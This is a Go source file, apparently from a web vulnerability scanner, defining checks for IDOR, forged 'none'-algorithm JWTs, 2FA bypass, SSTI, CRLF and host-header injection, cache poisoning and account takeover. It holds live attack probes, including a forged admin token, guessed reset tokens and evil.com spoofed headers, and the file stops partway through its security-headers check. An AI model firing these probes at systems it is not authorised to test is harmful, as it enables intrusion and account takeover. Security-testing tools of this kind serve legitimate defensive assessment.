package scanner

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/Eliahhango/OmniScan/pkg/types"
)

var sharedClient = &http.Client{Timeout: 10 * time.Second}

type CustomScanner struct {
	Target  string
	Results chan<- types.Finding
}

func NewCustomScanner(target string) *CustomScanner {
	return &CustomScanner{Target: target}
}

func (cs *CustomScanner) Run(ctx context.Context) {
	defer close(cs.Results)
	for _, c := range CustomChecks {
		select {
		case <-ctx.Done():
			return
		default:
		}
		findings, err := c.Check(cs.Target)
		if err != nil {
			continue
		}
		for _, f := range findings {
			select {
			case <-ctx.Done():
				return
			case cs.Results <- f:
			}
		}
	}
}

type CustomCheck struct {
	Name        string
	Description string
	Check       func(target string) ([]types.Finding, error)
}

var CustomChecks = []CustomCheck{
	{
		Name:        "idor-detection",
		Description: "IDOR detection via UUID enumeration and sequential IDs",
		Check:       checkIDOR,
	},
	{
		Name:        "race-condition",
		Description: "Race condition testing",
		Check:       checkRaceCondition,
	},
	{
		Name:        "2fa-bypass",
		Description: "2FA bypass checks",
		Check:       check2FABypass,
	},
	{
		Name:        "jwt-attacks",
		Description: "JWT attacks (none algorithm, key confusion)",
		Check:       checkJWTAuth,
	},
	{
		Name:        "ssti-detection",
		Description: "SSTI detection across template engines",
		Check:       checkSSTI,
	},
	{
		Name:        "graphql-introspection",
		Description: "GraphQL introspection + batching attacks",
		Check:       checkGraphQL,
	},
	{
		Name:        "websocket-vulns",
		Description: "WebSocket vulnerability checks",
		Check:       checkWebSocket,
	},
	{
		Name:        "cache-poisoning",
		Description: "Cache poisoning / cache deception",
		Check:       checkCachePoisoning,
	},
	{
		Name:        "prototype-pollution",
		Description: "Prototype pollution (client + server side)",
		Check:       checkPrototypePollution,
	},
	{
		Name:        "host-header-injection",
		Description: "Host header injection",
		Check:       checkHostHeaderInjection,
	},
	{
		Name:        "crlf-injection",
		Description: "CRLF injection",
		Check:       checkCRLFInjection,
	},
	{
		Name:        "account-takeover",
		Description: "Account takeover vectors",
		Check:       checkAccountTakeover,
	},
	{
		Name:        "dns-records",
		Description: "DNS record enumeration (A, AAAA, MX, NS, TXT)",
		Check:       checkDNS,
	},
	{
		Name:        "security-headers",
		Description: "HTTP security headers audit",
		Check:       checkSecurityHeaders,
	},
	{
		Name:        "port-scan",
		Description: "Quick TCP port scan (common ports)",
		Check:       checkPorts,
	},
	{
		Name:        "js-secrets",
		Description: "Scan JavaScript files for exposed secrets",
		Check:       checkJSSecrets,
	},
	{
		Name:        "ssrf-detection",
		Description: "SSRF detection via webhook, URL proxy, and cloud metadata endpoints",
		Check:       checkSSRF,
	},
	{
		Name:        "path-traversal",
		Description: "Path traversal / LFI probes on common endpoints",
		Check:       checkPathTraversal,
	},
	{
		Name:        "open-redirect",
		Description: "Open redirect detection on redirect_uri, next, continue params",
		Check:       checkOpenRedirect,
	},
	{
		Name:        "s3-bucket-enum",
		Description: "S3 bucket enumeration via URL patterns and public access",
		Check:       checkS3Buckets,
	},
	{
		Name:        "git-exposure",
		Description: "Git repository exposure (.git/config, .git/HEAD)",
		Check:       checkGitExposure,
	},
	{
		Name:        "cors-misconfig",
		Description: "CORS misconfiguration detection",
		Check:       checkCORS,
	},
	{
		Name:        "error-disclosure",
		Description: "Error message / stack trace leakage in responses",
		Check:       checkErrorDisclosure,
	},
	{
		Name:        "subdomain-takeover",
		Description: "Subdomain takeover check via CNAME analysis",
		Check:       checkSubdomainTakeover,
	},
	{
		Name:        "exposed-endpoints",
		Description: "Exposed admin, internal, and sensitive endpoints",
		Check:       checkExposedEndpoints,
	},
	{
		Name:        "sqli-detection",
		Description: "SQL injection detection via boolean/time-based blind probes",
		Check:       checkSQLi,
	},
	{
		Name:        "csrf-detection",
		Description: "Cross-Site Request Forgery (CSRF) protection check",
		Check:       checkCSRF,
	},
	{
		Name:        "command-injection",
		Description: "OS command injection detection on common parameters",
		Check:       checkCommandInjection,
	},
	{
		Name:        "xxe-detection",
		Description: "XML External Entity (XXE) injection detection",
		Check:       checkXXE,
	},
	{
		Name:        "http-smuggling",
		Description: "HTTP Request Smuggling detection via ambiguation",
		Check:       checkHTTPSmuggling,
	},
	{
		Name:        "xss-stored-dom",
		Description: "XSS injection probes (stored, DOM, Markdown, SVG vectors)",
		Check:       checkXSSProbes,
	},
	{
		Name:        "rate-limiting",
		Description: "Rate limiting / brute-force resistance check (87+ H1 reports)",
		Check:       checkRateLimiting,
	},
	{
		Name:        "deserialization",
		Description: "Insecure deserialization probes (Java, PHP, Python, Ruby)",
		Check:       checkDeserialization,
	},
	{
		Name:        "subdomain-enum",
		Description: "DNS-based subdomain enumeration (brute-force common names)",
		Check:       CheckSubdomainEnum,
	},
	{
		Name:        "url-crawler",
		Description: "HTML link crawler — discovers URLs from response bodies",
		Check:       CheckURLCrawler,
	},
	{
		Name:        "tech-fingerprint",
		Description: "Technology stack fingerprinting (CMS, frameworks, servers, CDN/WAF)",
		Check:       checkTechFingerprint,
	},
	{
		Name:        "cisa-kev",
		Description: "CISA Known Exploited Vulnerabilities check against scan findings",
		Check:       checkCisaKEV,
	},
	{
		Name:        "epss-score",
		Description: "EPSS exploit probability scoring for discovered CVEs",
		Check:       checkEPSS,
	},
}

func checkIDOR(target string) ([]types.Finding, error) {
	var findings []types.Finding

	endpoints := []string{
		"/api/users/1", "/api/users/2", "/api/users/3",
		"/api/profile/1", "/api/account/1",
		"/api/v1/users/1", "/api/v2/users/1",
		"/api/admin/users/1",
	}

	for _, ep := range endpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)
		resp, err := sharedClient.Get(u)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			bodyStr := strings.ToLower(string(body))
			if strings.Contains(bodyStr, "email") || strings.Contains(bodyStr, `"id":`) ||
				strings.Contains(bodyStr, "password") || strings.Contains(bodyStr, "role") ||
				strings.Contains(bodyStr, "admin") {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("idor-seq-%s", ep),
					Title:       "Potential IDOR - Sequential ID Enumeration",
					Severity:    types.SeverityHigh,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
			}
		}
	}

	uuids := []string{
		"00000000-0000-0000-0000-000000000000",
		"11111111-1111-1111-1111-111111111111",
	}
	for _, uid := range uuids {
		for _, ep := range []string{"/api/users/", "/api/profile/"} {
			u := fmt.Sprintf("%s%s%s", strings.TrimRight(target, "/"), ep, uid)
			resp, err := sharedClient.Get(u)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := strings.ToLower(string(body))
			if resp.StatusCode == 200 && (strings.Contains(bodyStr, "email") || strings.Contains(bodyStr, "password") || strings.Contains(bodyStr, "role")) {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("idor-uuid-%s", uid[:8]),
					Title:       "Potential IDOR - Weak UUID Enumeration",
					Severity:    types.SeverityHigh,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
			}
		}
	}

	return findings, nil
}

func checkRaceCondition(target string) ([]types.Finding, error) {
	endpoints := []string{
		"/api/login", "/api/register", "/api/forgot-password",
		"/api/change-password", "/api/transfer",
	}

	concurrency := 20

	for _, ep := range endpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)

		var wg sync.WaitGroup
		responses := make(chan int, concurrency)

		for i := 0; i < concurrency; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				resp, err := sharedClient.Post(u, "application/json", bytes.NewReader([]byte(`{}`)))
				if err != nil {
					return
				}
				resp.Body.Close()
				responses <- resp.StatusCode
			}()
		}

		wg.Wait()
		close(responses)

		statusCounts := make(map[int]int)
		for code := range responses {
			statusCounts[code]++
		}

		if len(statusCounts) > 1 {
			hasSuccess := false
			for code := range statusCounts {
				if code >= 200 && code < 300 {
					hasSuccess = true
				}
			}
			if hasSuccess {
				return []types.Finding{{
					ID:          fmt.Sprintf("race-%s", strings.NewReplacer("/", "-").Replace(ep)),
					Title:       "Potential Race Condition",
					Severity:    types.SeverityMedium,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				}}, nil
			}
		}
	}

	return nil, nil
}

func check2FABypass(target string) ([]types.Finding, error) {
	var findings []types.Finding

	sensitiveEndpoints := []string{
		"/api/admin", "/api/settings", "/api/security",
		"/api/change-password", "/api/2fa/verify",
	}

	for _, ep := range sensitiveEndpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)

		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			continue
		}
		resp, err := sharedClient.Do(req)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		bodyStr := strings.ToLower(string(body))
		twoFAHeaderMissing := resp.Header.Get("X-2FA-Required") == "" &&
			resp.Header.Get("X-Auth-Required") == ""

		if resp.StatusCode == 200 && twoFAHeaderMissing {
			if strings.Contains(bodyStr, "2fa") || strings.Contains(bodyStr, "two-factor") {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("2fa-bypass-%s", ep),
					Title:       "Potential 2FA Bypass",
					Severity:    types.SeverityHigh,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
			}
		}

		payloads := []string{
			`{"2fa":"skip","2fa_verified":true}`,
			`{"2fa":"bypass","2fa_enabled":false}`,
			`{"otp":"","2fa_code":null}`,
		}
		for _, payload := range payloads {
			req2, err := http.NewRequest("POST", u, bytes.NewReader([]byte(payload)))
			if err != nil {
				continue
			}
			req2.Header.Set("Content-Type", "application/json")
			resp2, err := sharedClient.Do(req2)
			if err != nil {
				continue
			}
			resp2.Body.Close()
			if resp2.StatusCode == 200 {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("2fa-bypass-param-%s", ep),
					Title:       "2FA Bypass via Parameter Manipulation",
					Severity:    types.SeverityCritical,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
				break
			}
		}
	}

	return findings, nil
}

func checkJWTAuth(target string) ([]types.Finding, error) {
	var findings []types.Finding

	noneHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	nonePayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin","iat":1516239022}`))
	noneToken := fmt.Sprintf("%s.%s", noneHeader, nonePayload)

	endpoints := []string{
		"/api/admin", "/api/users", "/api/profile",
		"/api/protected", "/api/dashboard",
	}

	for _, ep := range endpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)

		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+noneToken)

		resp, err := sharedClient.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("jwt-none-%s", ep),
				Title:       "JWT 'none' Algorithm Accepted",
				Severity:    types.SeverityCritical,
				AffectedURL: u,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	for _, ep := range endpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)

		privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			continue
		}
		pubBytes, err := x509.MarshalPKIXPublicKey(&privateKey.PublicKey)
		if err != nil {
			continue
		}
		pemBlock := &pem.Block{Type: "PUBLIC KEY", Bytes: pubBytes}
		pemData := pem.EncodeToMemory(pemBlock)

		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("X-Public-Key", string(pemData))
		req.Header.Set("Authorization", "Bearer test-key-confusion-token")

		resp, err := sharedClient.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("jwt-keyconf-%s", ep),
				Title:       "Potential JWT Key Confusion",
				Severity:    types.SeverityCritical,
				AffectedURL: u,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkSSTI(target string) ([]types.Finding, error) {
	var findings []types.Finding

	tests := []struct {
		name    string
		payload string
	}{
		{"jinja2", "{{7*7}}"},
		{"freemarker", "${7*7}"},
		{"ruby", "#{7*7}"},
		{"velocity", "${{7*7}}"},
		{"smarty", "{7*7}"},
	}

	params := []string{"name", "search", "q", "query", "page", "file", "template", "view"}

	for _, t := range tests {
		for _, param := range params {
			u := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "/"),
				param, url.QueryEscape(t.payload))
			resp, err := sharedClient.Get(u)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := string(body)
			if strings.Contains(bodyStr, "49") || strings.Contains(bodyStr, "7*7") {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("ssti-%s-%s", t.name, param),
					Title:       fmt.Sprintf("SSTI Detected - %s", t.name),
					Severity:    types.SeverityCritical,
					AffectedURL: u,
					Payload:     t.payload,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
				break
			}
		}
	}

	return findings, nil
}

func checkGraphQL(target string) ([]types.Finding, error) {
	var findings []types.Finding

	introspectionQuery := `{"query":"query { __schema { types { name fields { name } } } }"}`
	endpoints := []string{"/graphql", "/api/graphql", "/graph", "/query", "/v1/graphql"}

	for _, ep := range endpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)

		resp, err := sharedClient.Post(u, "application/json", strings.NewReader(introspectionQuery))
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var result map[string]interface{}
			if json.Unmarshal(body, &result) == nil {
				if data, ok := result["data"].(map[string]interface{}); ok {
					if schema, ok := data["__schema"].(map[string]interface{}); ok {
						if typesList, ok := schema["types"].([]interface{}); ok && len(typesList) > 0 {
							findings = append(findings, types.Finding{
								ID:          fmt.Sprintf("graphql-introspect-%s", ep),
								Title:       "GraphQL Introspection Enabled",
								Severity:    types.SeverityHigh,
								AffectedURL: u,
								ToolSource:  "custom",
								Timestamp:   time.Now(),
							})
						}
					}
				}
			}
		}
	}

	return findings, nil
}

func checkWebSocket(target string) ([]types.Finding, error) {
	var findings []types.Finding

	wsTarget := strings.Replace(target, "https://", "wss://", 1)
	wsTarget = strings.Replace(wsTarget, "http://", "ws://", 1)

	wsEndpoints := []string{"/ws", "/websocket", "/socket", "/chat", "/api/ws", "/ws/"}

	for _, ep := range wsEndpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(wsTarget, "/"), ep)
		hostPort := strings.TrimPrefix(strings.TrimPrefix(u, "wss://"), "ws://")
		if idx := strings.IndexByte(hostPort, '/'); idx >= 0 {
			hostPort = hostPort[:idx]
		}
		if !strings.Contains(hostPort, ":") {
			if strings.HasPrefix(u, "wss://") {
				hostPort += ":443"
			} else {
				hostPort += ":80"
			}
		}

		conn, err := net.DialTimeout("tcp", hostPort, 3*time.Second)
		if err != nil {
			continue
		}
		conn.Close()

		origins := []string{"https://evil.com", "null", "http://192.168.1.1"}
		for _, origin := range origins {
			httpURL := strings.Replace(u, "ws://", "http://", 1)
			httpURL = strings.Replace(httpURL, "wss://", "https://", 1)

			req, err := http.NewRequest("GET", httpURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("Origin", origin)
			req.Header.Set("Connection", "Upgrade")
			req.Header.Set("Upgrade", "websocket")
			req.Header.Set("Sec-WebSocket-Version", "13")
			req.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")

			client := &http.Client{Timeout: 5 * time.Second}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode == 101 {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("ws-origin-%s", origin),
					Title:       "WebSocket Missing Origin Validation",
					Severity:    types.SeverityHigh,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
				break
			}
		}
	}

	return findings, nil
}

func checkCachePoisoning(target string) ([]types.Finding, error) {
	var findings []types.Finding
	target = ensureURL(target)

	maliciousHost := "evil.com"

	req, err := http.NewRequest("GET", target, nil)
	if err != nil || req == nil {
		return findings, nil
	}
	req.Header.Set("X-Forwarded-Host", maliciousHost)
	req.Header.Set("X-Forwarded-Scheme", "https")

	resp, err := sharedClient.Do(req)
	if err == nil {
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			return findings, nil
		}

		bodyStr := strings.ToLower(string(body))
		if strings.Contains(bodyStr, maliciousHost) || strings.Contains(bodyStr, "evil") {
			findings = append(findings, types.Finding{
				ID:          "cache-poison-xfh",
				Title:       "Cache Poisoning via X-Forwarded-Host",
				Severity:    types.SeverityHigh,
				AffectedURL: target,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	poisonHeaders := map[string]string{
		"X-Original-URL":         "/admin",
		"X-Rewrite-URL":          "/admin",
		"X-HTTP-Method-Override": "GET",
	}
	for header, value := range poisonHeaders {
		req2, err := http.NewRequest("GET", target, nil)
		if err != nil {
			continue
		}
		req2.Header.Set(header, value)
		resp2, err := sharedClient.Do(req2)
		if err != nil {
			continue
		}
		body2, err := io.ReadAll(resp2.Body)
		resp2.Body.Close()
		if err != nil {
			continue
		}

		if strings.Contains(strings.ToLower(string(body2)), "evil") || resp2.StatusCode == 200 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("cache-poison-%s", header),
				Title:       "Cache Poisoning via Header Injection",
				Severity:    types.SeverityMedium,
				AffectedURL: target,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkPrototypePollution(target string) ([]types.Finding, error) {
	var findings []types.Finding
	target = ensureURL(target)

	payloads := []string{
		"?__proto__[test]=true",
		"?constructor[prototype][test]=true",
		"?__proto__.test=true",
	}

	for _, payload := range payloads {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), payload)
		resp, err := sharedClient.Get(u)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		bodyStr := strings.ToLower(string(body))
		if strings.Contains(bodyStr, "__proto__") || strings.Contains(bodyStr, "constructor") {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("proto-pollution-%s", payload[:20]),
				Title:       "Server-Side Prototype Pollution Reflection",
				Severity:    types.SeverityHigh,
				AffectedURL: u,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkHostHeaderInjection(target string) ([]types.Finding, error) {
	var findings []types.Finding
	target = ensureURL(target)
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	maliciousHosts := []string{"evil.com", "target.com", "127.0.0.1"}	
	for _, host := range maliciousHosts {
		req, err := http.NewRequest("GET", target, nil)
		if err != nil || req == nil {
			continue
		}
		req.Host = host

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		bodyStr := strings.ToLower(string(body))
		if strings.Contains(bodyStr, host) || resp.StatusCode == 200 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("host-injection-%s", host),
				Title:       "Host Header Injection",
				Severity:    types.SeverityHigh,
				AffectedURL: target,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkCRLFInjection(target string) ([]types.Finding, error) {
	var findings []types.Finding
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	crlfPayloads := []string{
		"%0d%0aX-Injected:%20true",
		"%0d%0aInjected-Header:%20yes",
	}

	for _, payload := range crlfPayloads {
		u := fmt.Sprintf("%s/%s", strings.TrimRight(target, "/"), payload)
		req, err := http.NewRequest("GET", u, nil)
		if err != nil || req == nil {
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		bodyStr := string(body)
		if strings.Contains(bodyStr, "X-Injected") || strings.Contains(bodyStr, "Injected-Header") {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("crlf-%s", payload[:15]),
				Title:       "CRLF Injection",
				Severity:    types.SeverityHigh,
				AffectedURL: u,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkAccountTakeover(target string) ([]types.Finding, error) {
	var findings []types.Finding

	resetEndpoints := []string{
		"/api/reset-password", "/api/forgot-password",
		"/api/auth/reset", "/password-reset",
	}

	for _, ep := range resetEndpoints {
		u := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), ep)

		for _, token := range []string{"123456", "000000", "111111", "token=1", "token=admin"} {
			req, err := http.NewRequest("POST", u,
				bytes.NewReader([]byte(fmt.Sprintf(`{"token":"%s","email":"test@test.com"}`, token))))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/json")

			resp, err := sharedClient.Do(req)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := strings.ToLower(string(body))
			if resp.StatusCode == 200 && !strings.Contains(bodyStr, "invalid") && !strings.Contains(bodyStr, "error") {
				findings = append(findings, types.Finding{
					ID:          fmt.Sprintf("ato-reset-%s", ep),
					Title:       "Weak Password Reset Token",
					Severity:    types.SeverityCritical,
					AffectedURL: u,
					ToolSource:  "custom",
					Timestamp:   time.Now(),
				})
				break
			}
		}

		emailChangePayload := `{"email":"attacker@evil.com","current_email":"test@test.com"}`
		req, err := http.NewRequest("POST", u, bytes.NewReader([]byte(emailChangePayload)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := sharedClient.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 200 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("ato-email-change-%s", ep),
				Title:       "Email Change Without Verification",
				Severity:    types.SeverityCritical,
				AffectedURL: u,
				ToolSource:  "custom",
				Timestamp:   time.Now(),
			})
		}
	}

	return findings, nil
}

func checkDNS(target string) ([]types.Finding, error) {
	var findings []types.Finding
	host := strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://")
	host = strings.Split(host, "/")[0]
	host = strings.Split(host, ":")[0]

	if ips, err := net.LookupHost(host); err == nil && len(ips) > 0 {
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("dns-a-%s", host),
			Title:       "DNS Records Found",
			Description: fmt.Sprintf("Resolved %s to %d IP addresses: %s", host, len(ips), strings.Join(ips, ", ")),
			Severity:    types.SeverityInfo,
			AffectedURL: target,
			ToolSource:  "custom-dns",
			Timestamp:   time.Now(),
		})
	}

	if mx, err := net.LookupMX(host); err == nil && len(mx) > 0 {
		mxStr := make([]string, len(mx))
		for i, m := range mx {
			mxStr[i] = fmt.Sprintf("%d %s", m.Pref, m.Host)
		}
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("dns-mx-%s", host),
			Title:       "Mail Exchanger Records",
			Description: fmt.Sprintf("MX records for %s: %s", host, strings.Join(mxStr, "; ")),
			Severity:    types.SeverityInfo,
			AffectedURL: target,
			ToolSource:  "custom-dns",
			Timestamp:   time.Now(),
		})
	}

	if ns, err := net.LookupNS(host); err == nil && len(ns) > 0 {
		nsStr := make([]string, len(ns))
		for i, n := range ns {
			nsStr[i] = n.Host
		}
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("dns-ns-%s", host),
			Title:       "Name Server Records",
			Description: fmt.Sprintf("NS records for %s: %s", host, strings.Join(nsStr, "; ")),
			Severity:    types.SeverityInfo,
			AffectedURL: target,
			ToolSource:  "custom-dns",
			Timestamp:   time.Now(),
		})
	}

	if txt, err := net.LookupTXT(host); err == nil && len(txt) > 0 {
		txtStr := strings.Join(txt, "; ")
		if len(txtStr) > 500 {
			txtStr = txtStr[:500] + "..."
		}
		findings = append(findings, types.Finding{
			ID:          fmt.Sprintf("dns-txt-%s", host),
			Title:       "TXT Records",
			Description: fmt.Sprintf("TXT records for %s: %s", host, txtStr),
			Severity:    types.SeverityInfo,
			AffectedURL: target,
			ToolSource:  "custom-dns",
			Timestamp:   time.Now(),
		})
	}

	return findings, nil
}

func ensureURL(target string) string {
	if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") {
		return target
	}
	return "https://" + target
}

func checkSecurityHeaders(target string) ([]types.Finding, error) {
	var findings []types.Finding
	target = ensureURL(target)
	resp, err := sharedClient.Get(target)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	securityHeaders := map[string]struct {
		Name          string
		Description   string
		Severity      types.Severity
		CVSS          float64
		CVSSVector    string
		CWE           []string
		OWASP         string
		AttackScenario string
		Evidence      string
		Remediation   string
	}{
		"Content-Security-Policy": {
			"Missing CSP",
			"No Content-Security-Policy — vulnerable to XSS and data injection",
			types.SeverityHigh, 6.1, "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
			[]string{"CWE-693", "CWE-1021"}, "A03:2021 – Injection",
			"An attacker who identifies even a minor input reflection vulnerability could inject a script that silently exfiltrates session cookies to a remote server, potentially hijacking every logged-in user's account.",
			"HTTP Response Headers:\n  ✗ Content-Security-Policy: [NOT PRESENT]",
			"Set Content-Security-Policy header. Nginx: `add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';\" always;`",
		},
		"Strict-Transport-Security": {
			"Missing HSTS",
			"No Strict-Transport-Security — no HTTPS enforcement",
			types.SeverityHigh, 7.4, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
			[]string{"CWE-319"}, "A02:2021 – Cryptographic Failures",
			"A user on public WiFi visits the site over HTTP (first visit or after cache clear). An attacker running sslstrip intercepts the connection before the HTTPS redirect fires, capturing login credentials in plaintext.",
			"HTTP Response Headers:\n  ✗ Strict-Transport-Security: [NOT PRESENT]",
			"Set Strict-Transport-Security header. Nginx: `add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;`",
		},
		"X-Frame-Options": {
			"Missing X-Frame-Options",
			"No X-Frame-Options — clickjacking risk",
			types.SeverityMedium, 4.3, "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
			[]string{"CWE-1021"}, "A05:2021 – Security Misconfiguration",
			"The site can be embedded in an iframe on any origin. An attacker overlays an invisible iframe of the site over a fake page, tricking users into clicking buttons they cannot see.",
			"HTTP Response Headers:\n  ✗ X-Frame-Options: [NOT PRESENT]",
			"Set X-Frame-Options header. Nginx: `add_header X-Frame-Options \"SAMEORIGIN\" always;`",
		},
		"X-Content-Type-Options": {
			"Missing X-Content-Type-Options",
			"No X-Content-Type-Options — MIME-sniffing risk",
			types.SeverityMedium, 4.3, "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
			[]string{"CWE-116"}, "A05:2021 – Security Misconfiguration",
			"Browsers may sniff the MIME type of a response, potentially executing an uploaded file disguised as an image as a script.",
			"HTTP Response Headers:\n  ✗ X-Content-Type-Options: [NOT PRESENT]",
			"Set X-Content-Type-Options header. Nginx: `add_header X-Content-Type-Options \"nosniff\" always;`",
		},
		"Referrer-Policy": {
			"Missing Referrer-Policy",
			"No Referrer-Policy — referrer leakage risk",
			types.SeverityLow, 3.1, "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
			[]string{"CWE-200"}, "A05:2021 – Security Misconfiguration",
			"The full URL including path and query parameters is sent in the Referer header to external sites when users click outbound links. If URLs contain session tokens or user IDs, they may leak to third-parties.",
			"HTTP Response Headers:\n  ✗ Referrer-Policy: [NOT PRESENT]",
			"Set Referrer-Policy header. Nginx: `add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;`",
		},
		"Permissions-Policy": {
			"Missing Permissions-Policy",
			"No Permissions-Policy — feature permissions unconstrained",
			types.SeverityLow, 2.6, "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
			[]string{"CWE-693"}, "A05:2021 – Security Misconfiguration",
			"Injected scripts or rogue iframes have access to all browser APIs (camera, microphone, geolocation) by default.",
			"HTTP Response Headers:\n  ✗ Permissions-Policy: [NOT PRESENT]",
			"Set Permissions-Policy header. Nginx: `add_header Permissions-Policy \"camera=(), microphone=(), geolocation=(), payment=()\" always;`",
		},
		"X-XSS-Protection": {
			"Missing X-XSS-Protection",
			"No X-XSS-Protection header",
			types.SeverityLow, 2.6, "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
			[]string{"CWE-79"}, "A03:2021 – Injection",
			"Legacy browsers (IE, older Edge) lack the built-in XSS filter, increasing XSS risk for users on older systems.",
			"HTTP Response Headers:\n  ✗ X-XSS-Protection: [NOT PRESENT]",
			"Set X-XSS-Protection header. Nginx: `add_header X-XSS-Protection \"1; mode=block\" always;`",
		},
